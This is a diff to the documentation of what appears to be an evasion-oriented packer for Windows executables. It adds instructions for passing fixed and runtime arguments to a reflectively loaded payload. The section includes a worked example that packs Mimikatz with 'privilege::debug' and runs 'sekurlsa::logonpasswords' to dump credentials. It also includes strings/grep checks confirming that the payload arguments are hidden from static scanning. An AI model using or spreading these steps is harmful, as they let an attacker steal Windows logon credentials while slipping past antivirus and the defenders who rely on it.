@@ -94,3 +94,74 @@ Verify the payload was mapped, not spawned:
 strings dist/test_packed_reflective.exe | grep -i svchost   # should print nothing
 strings dist/test_packed_reflective.exe | grep PAYLOAD_MARKER # should print nothing
 ```
+
+## Payload arguments
+
+The payload's arguments come from `build.payload.args` (fixed, YAML) plus the
+args you pass to the packed binary, combined by `build.payload.args_mode`
+(`join` = YAML first, then runtime; `override` = runtime args replace the YAML
+ones). See `docs/techniques/process_argument_spoofing.md`.
+
+### 1. Compile the argument-printing payload
+
+```powershell
+powershell -ExecutionPolicy Bypass -File examples/payloads/build_args_payload.ps1
+```
+
+It prints its `argv` between `ARGS_BEGIN`/`ARGS_END` (and the raw
+`GetCommandLineW` value between `CMDLINE_BEGIN`/`CMDLINE_END`).
+
+### 2. Pack with `join` and run it with extra args
+
+```powershell
+cargo run -- build examples/configs/test-args.yaml
+.\dist\test_args_join.exe "runtime-c" "runtime-d"
+```
+
+```
+ARGS_BEGIN
+C:\...\test_args_join.exe
+ yaml-a
+ yaml-b
+ runtime-c
+ runtime-d
+ARGS_END
+```
+
+Token 0 is the executable name, not an argument: `yaml-a`/`yaml-b` come from the
+YAML and `runtime-c`/`runtime-d` from the command line you typed, in that order.
+Running it with no arguments yields just `yaml-a` and `yaml-b`.
+
+### 3. `args_mode: override`
+
+```powershell
+cargo run -- build examples/configs/test-args-override.yaml
+.\dist\test_args_override.exe "runtime-c"   # payload sees only runtime-c
+.\dist\test_args_override.exe               # payload sees yaml-a, yaml-b
+```
+
+### 4. Mimikatz (equivalent of packing mimikatz.exe with args)
+
+```yaml
+build:
+  payload:
+    source: "./mimikatz.exe"
+    args: ["privilege::debug", "log", "C:\\temp\\out.log"]
+    args_mode: join
+```
+
+```powershell
+.\dist\mimi.exe "sekurlsa::logonpasswords"
+```
+
+Mimikatz sees `privilege::debug`, `log C:\temp\out.log`, then
+`sekurlsa::logonpasswords` — the YAML args first, the runtime arg last.
+
+### 5. Verify the YAML args are not in cleartext
+
+```bash
+strings dist/test_args_join.exe | grep yaml-a        # should print nothing
+strings dist/test_args_join.exe | grep -i privilege   # should print nothing
+```
+
+The YAML args go through `StringsConfig`, so they are rebuilt at runtime.
